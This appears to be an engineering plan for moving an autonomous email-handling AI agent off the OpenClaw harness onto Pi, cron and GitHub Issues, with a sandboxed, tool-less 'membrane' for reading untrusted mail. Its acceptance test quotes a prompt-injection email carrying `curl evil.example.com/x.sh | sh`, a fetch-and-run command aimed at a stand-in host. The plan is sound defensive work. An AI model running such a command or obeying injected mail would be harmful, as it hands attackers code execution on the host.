# Migrating off OpenClaw

The plan for replacing OpenClaw with Pi and cron. Written 2026-09-11, after [HARNESS-ALTERNATIVES.md](HARNESS-ALTERNATIVES.md) measured where the tokens go and [OPENCLAW-AND-PI.md](OPENCLAW-AND-PI.md) worked out how the two fit together. Those two are the reasoning; this is the build order.

The goal is a box you can hold in your head: a handful of shell scripts, a crontab, prompt files, and `pi`. No Gateway, no TypeScript plugins, no `openclaw.json`, no Control UI. The [README's comparison table](../README.md#how-this-differs-from-the-clone-kit) currently describes a platform on one side and Rohrer's clone kit on the other, and this moves us most of the way toward the kit's column — deliberately, and with one exception.

## The one thing that must not regress

The exception is the trust boundary. The README says it plainly: **the kit optimizes for never stopping, and this project optimizes for never trusting the input.** Simplifying the machinery is the whole point of this migration; dropping the membrane is not part of it, and a version of this plan that quietly loses it is a failure even if every pass runs.

The good news is that it should get *stronger*. Every sandbox failure this project has recorded was the same shape: config declared a boundary that nothing enforced, and the tool that reports on it lied. `sandbox explain` printed `runtime: sandboxed` for a reader that had a shell, Docker, and the network. Under Pi the membrane stops being a config assertion and becomes a Unix one — a separate user with no credentials, running a process started with no tools. That is a claim you verify by trying to break it, which is the only kind of verification this project has found reliable.

## The gate before anything else

**Do not start Phase 1 until Phase 0 answers two questions.** Everything below assumes Pi can do the work and that we can afford it, and neither is established.

Nothing in this plan is expensive to abandon at Phase 0. Everything after it is.

## Target architecture

One box, three Unix users, five scripts, one crontab.

```
/srv/ichabod/
  bin/
    pass          run one prompt file under pi, with a lock and a timeout
    intake        fetch mail -> membrane -> issue
    notify        send one email
    health        touch on success; shout when stale
  prompts/
    route.md  work.md  scout.md  digest.md  membrane.md
  workspace/      AGENTS.md, IDENTITY.md, SOUL.md, USER.md, MEMORY.md, memory/, skills/
  log/            YYYY-MM-DD/HHMM-<pass>.jsonl, one per run
  env             0600, the API keys, sourced by the wrappers
```

| User | Runs | Has |
|---|---|---|
| `ichabod` | every pass and every worker | Docker, `gh`, the API key, the mailbox, sudo where it already has it |
| `ichabod-mail` | the membrane only | nothing — no credentials, no Docker, no sudo, no network beyond localhost |
| `openclaw` | nothing, once this is done | deleted at the end |

The crontab, as a starting shape:

```cron
*/5  * * * *  /srv/ichabod/bin/intake
*/15 * * * *  /srv/ichabod/bin/pass route
*/15 * * * *  /srv/ichabod/bin/pass work
0 4,11,18 * * *  /srv/ichabod/bin/pass scout
0 7  * * *    /srv/ichabod/bin/pass digest
```

`pass` is the whole harness. Roughly:

```bash
#!/usr/bin/env bash
set -euo pipefail
name="$1"
set -a; . /srv/ichabod/env; set +a
exec flock -n "/run/ichabod/$name.lock" \
  timeout 1800 \
  pi -p --mode json --tools read,write,edit,bash --no-session \
     -C /srv/ichabod/workspace \
     @"/srv/ichabod/prompts/$name.md" \
  > "/srv/ichabod/log/$(date +%F)/$(date +%H%M)-$name.jsonl"
```

`flock -n` is the concurrency rule that `--max-starts 1` enforces today: if the previous run is still going, this one exits rather than stacking. `timeout` is the stall recovery that "a `running` card that has not moved in over an hour is stuck" currently handles by hand.

**Keep `route` and `work` separate at first, even though collapsing them is tempting.** `route.md` is `director.md` with the workboard commands swapped out, and that prompt is battle-tested — eight numbered steps refined against real failures. `work.md` is new. Merging them into one "read the board, do the next thing" loop is the genuinely Sammy-shaped end state and is probably right eventually, but it changes two things at once. Do it as a later simplification, once the substrate is proven, and do it because the separation turned out not to earn its keep rather than on principle.

## What replaces what

| OpenClaw provides | Replacement | Confidence |
|---|---|---|
| Scheduler (`automations`) | cron + `flock` + `timeout` | High. This is cron's actual job |
| Agent loop, context assembly | `pi -p` | High, pending Phase 0 |
| Workboard | GitHub Issues via `gh` (see below) | High, but it is the decision to confirm |
| `triage-guard` hook | The membrane's wrapper — it parses Pi's output and writes the issue itself | High. Stronger than a hook |
| Sandbox for `mail_reader` | A Unix user with nothing, running Pi with no tools | High, and testable |
| IMAP intake plugin | ~40 lines of Python `imaplib` in `intake` | High. It already does DMARC checks we can keep |
| `smtp-send` plugin | ~20 lines of Python `smtplib` in `notify` | High |
| `mailbox` plugin (search/archive) | The same script, more subcommands | High |
| SecretRefs + secret store | `/srv/ichabod/env`, mode 0600 | High, and honest — see below |
| Session ledger, token accounting | Pi's `--mode json` events, one file per run in `log/` | High. Better for forensics than today |
| `backup create --verify` | `git commit` of `workspace/` to a private repo, every pass | High. Off-box and diffable |
| Model fallback chain | Nothing. A provider outage fails the pass; cron retries | Accepted loss |
| Control UI | Nothing. `tail`, `jq`, and the issue tracker | Accepted loss |
| Multi-agent routing, `templates/new-agent` | A prompt file and a cron line | Simplification, not a loss |

**On secrets, say the true thing.** The guide already concedes OpenClaw's store "is not an HSM: values are stored in its local SQLite state and protected by filesystem permissions." A 0600 file protected by filesystem permissions is the same security property with less machinery. What we actually lose is redaction — OpenClaw kept values out of model context by construction, and a shell-sourced env var is one `env` call away from a transcript. The mitigation is that `ichabod` is root-equivalent anyway and always was; the membrane, which is the user we do not trust, gets no keys at all.

## The board

**Recommendation: GitHub Issues in a private repo owned by `ich4bod`, driven by `gh`.** Labels carry status (`triage`, `ready`, `running`, `blocked`), and the issue body plus its comment thread carry what the journal carries today.

Four reasons, in order of weight:

1. **It deletes the twin-card problem entirely.** Two cards per emailed request exists because `create --agent` is the only place an owner can be set and `move` cannot add one. `gh issue edit` can change anything at any time, so an intake issue is triaged in place and never duplicated.
2. **It deletes the projection problem.** `openclaw workboard list --json` is over 300 KB and truncates mid-card, which is why `director.md` step 1 is a Python one-liner. `gh issue list --state open --json number,title,labels` is already small.
3. **It gives the journal a home on the work item.** The journal directory is fat because the board cannot be annotated. A comment on an issue is annotation, so most of `memory/YYYY-MM-DD/` stops existing and the passes stop reading it.
4. **Zach's own rule says to.** The global `CLAUDE.md`: *use GitHub and GitLab Issues and Work Items to log work items.* Scout already sweeps GitHub issues onto the board, so half the integration is a deletion.

Alternatives considered. **Markdown files in `workspace/board/`** is the purest Sammy answer and needs no network, but it reinvents state transitions, concurrency, and history, and the clone kit's documented failure mode is exactly memory files degrading unnoticed. **SQLite** is durable and local but has no UI, so debugging means writing queries. **Keep the workboard** is not available — it is a Gateway feature, and the Gateway is what we are removing.

The cost of GitHub Issues is a hard dependency on GitHub being up and the token being valid, for the loop itself and not just for code. That is a real coupling and worth naming out loud, but the box already depends on `gh` for everything it ships.

## The membrane, rebuilt

The risky piece, so it is specified rather than sketched.

`intake` runs as `ichabod-mail` and does four things in order:

1. **Fetch.** `imaplib`, one unread message, DMARC and allowed-sender checks kept exactly as `configure-imap` has them today. An empty `allowedSenders` must still disable the account rather than admit everyone.
2. **Read, with nothing.** Pipe the message body to `pi -p --tools "" --no-session @prompts/membrane.md`. **No tools at all.** Not a restricted set — an empty one. The process cannot read a file, run a command, or reach the network. Its only possible output is text on stdout.
3. **Parse, don't trust.** The wrapper parses that text as strict JSON against a fixed schema: `title`, `summary`, `sender`, `suspicious`. Anything else fails the message into a quarantine folder and emails Zach. The wrapper — not the model — then calls `gh issue create` with a fixed label set.
4. **Never carry an assignment.** `triage-guard` exists because a card could assign itself. Here the wrapper writes the issue and the schema has no field for an owner, so there is nothing to strip. The guard becomes structurally unnecessary rather than enforced.

**Acceptance is the test that already exists.** The README records a live injection test: a message containing `curl evil.example.com/x.sh | sh` produced a card noting it as prompt-injection content, and the Gateway independently logged the reader as `writable: false`. Re-run that exact message. It must produce an issue labelled suspicious, and `ichabod-mail` must be provably unable to have run anything — which, with no tools and no credentials, is checkable by trying it rather than by reading a config.

The step-3 rule is the important one and it is a genuine improvement on today. Right now the reader *has* a tool (`workboard_create`) and a hook sanitises its arguments. After this the reader has no tools and the wrapper constructs the write. The model's output stops being a set of instructions and becomes a string that gets validated. That is the same lesson as the fabricated `Message-ID`: an absent field is safe, an invented one is not, and the fix is a schema the model fills rather than a call the model makes.

## Phases

Each phase ends in a state the box can sit in indefinitely. Nothing after Phase 0 is a big-bang cutover.

### Phase 0 — Prove it, change nothing

- [ ] Install `pi` on the box as a new `ichabod` user. OpenClaw keeps running untouched.
- [ ] Run `scout.md` under `pi -p` by hand. Measure the preamble off the first `--mode json` usage event.
- [ ] Confirm the board round-trip: `gh issue create` from inside Pi's `bash`, as `ichabod`.
- [ ] Establish the model and the currency. Can Pi use the Claude subscription, or is this API-key-only? Price one real pass, then multiply by the crontab above and by a day of dispatched workers.
- [ ] **Gate:** a measured preamble well under 38,831, a real issue created, and a daily cost Zach has looked at and accepted. If any one fails, stop and keep OpenClaw.

The cost question is the one to be careful with. Zach has accepted an API key for a pass, and a pass is cheap. **Dispatched workers on Opus are not**, and they are where the token volume actually lives. Price those separately before committing.

### Phase 1 — Skeleton, nothing scheduled

- [ ] `runtime/` in this repo: `bin/`, `prompts/`, a crontab template, a deploy script.
- [ ] Deploy it alongside OpenClaw. Both stacks on the box, only one of them scheduled.
- [ ] `notify` first, since the digest needs it, and it is the smallest end-to-end proof that the new stack can reach the outside world.
- [ ] **Acceptance:** an email from `notify`, sent by cron, arriving with the right envelope sender.

### Phase 2 — Move the read-only passes

Scout and digest. They read and report; if they break, nothing is lost and you find out in a day.

- [ ] Port `scout.md` and `digest.md` to the new prompts directory.
- [ ] Remove the OpenClaw jobs for both, add the cron lines.
- [ ] Run for three days next to an untouched director.
- [ ] **Acceptance:** three digests, three days of scout sweeps, no silent skips. Compare per-pass cost against Phase 0's estimate.

### Phase 3 — The board

The biggest single piece, and the point of no easy return.

- [ ] Create the private issues repo. Define the label set.
- [ ] Migrate live cards. Everything not `done` becomes an issue; `done` cards are exported to a file and dropped.
- [ ] Rewrite `director.md` into `route.md` against `gh`. Steps 2, 4, 5, 6 and 7 all get shorter, and step 7 disappears.
- [ ] Write `work.md` — take the top `ready` issue, do it, comment what happened, relabel.
- [ ] **Acceptance:** a week of routing and one real card taken from `triage` to `done` entirely on the new stack, with the reasoning readable on the issue.

### Phase 4 — The membrane

- [ ] Create `ichabod-mail` with nothing.
- [ ] Build `intake` and `membrane.md` to the four-step spec above.
- [ ] **Acceptance:** the README's injection message produces a suspicious-labelled issue and nothing else; a normal message produces a clean one; a malformed model response quarantines rather than guesses. Turn off OpenClaw's IMAP account only after all three pass.

### Phase 5 — Delete OpenClaw

One commit, at the end, so the branch is additive until it isn't.

- [ ] Stop and disable the Gateway. Uninstall.
- [ ] Delete `plugins/`, `scripts/configure-*`, `scripts/install-plugin`, `scripts/build-sandbox-image`, the `sync`/`imap`/`plugins`/`ui`/`openclaw` Makefile targets.
- [ ] Rewrite `README.md` and `docs/ICHABOD-GUIDE.md`. Most of the guide's hard-won OpenClaw lessons stop applying and should be cut, not archived in place — `git log` is the archive.
- [ ] Rewrite `workspace/AGENTS.md`: no Workboard cards, no Gateway restarts, no `openclaw` authority language.
- [ ] Delete the `openclaw` user.

### Phase 6 — Reap

- [ ] Re-check the instance type. `t3a.large` was sized for a Node Gateway, a sandbox image, and Docker. Two of those are gone.
- [ ] Fold `route` and `work` into one loop if the separation has not earned itself.

## Branch discipline

- `zf/pi-migration` off `main`, long-lived, merged once at the end.
- **Additive until Phase 5.** Nothing is deleted while the old stack is still the one serving. That keeps the diff reviewable and every phase revertible with one deploy.
- Land the two memos on `main` first, in their own small PR, so this branch is only the build.
- Both stacks coexist on the box the whole time, under different Unix users. Cutover is per pass, by moving one cron line, never by flipping the machine.
- Each phase is its own commit with its acceptance evidence in the message.

## What we lose, stated plainly

- The Control UI, which is genuinely useful for debugging and has no replacement.
- Model fallback. A provider outage becomes a failed pass rather than a slower one.
- Typed plugin surfaces. Everything becomes shell and Python, which is easier to read and easier to get subtly wrong.
- The multi-agent story. `templates/new-agent` and "agents Ichabod creates himself" become "another prompt file and another cron line" — smaller, and less interesting.
- OpenClaw's own operational knowledge, most of `docs/ICHABOD-GUIDE.md`, several weeks of it hard-won.

## What gets simpler

- One preamble we control completely, instead of a third of it arriving from a server overnight.
- Synchronous `bash`, which is the contract every prompt on this box is already written against.
- Every failure reproducible from a shell. No `config validate` that passes on broken states, no `sandbox explain` that reports a boundary that isn't there.
- The trust boundary enforced by the kernel rather than by a config file, and testable by attacking it.
- Everything in git, including memory, including the journal.
- Nothing to keep alive. There is no daemon whose death is a silent outage.

## Open questions

- Can Pi use the Claude subscription, or is this API-key-only? Phase 0, and it sets the budget.
- What do dispatched workers cost on an API key? The passes are cheap and the workers are not, and only the workers are unbounded.
- Does GitHub Issues as the operating substrate feel right in practice, or does the loop want something with no network in the path?
- Does `route`/`work` need to stay split? Answerable only after Phase 3 has run for a while.
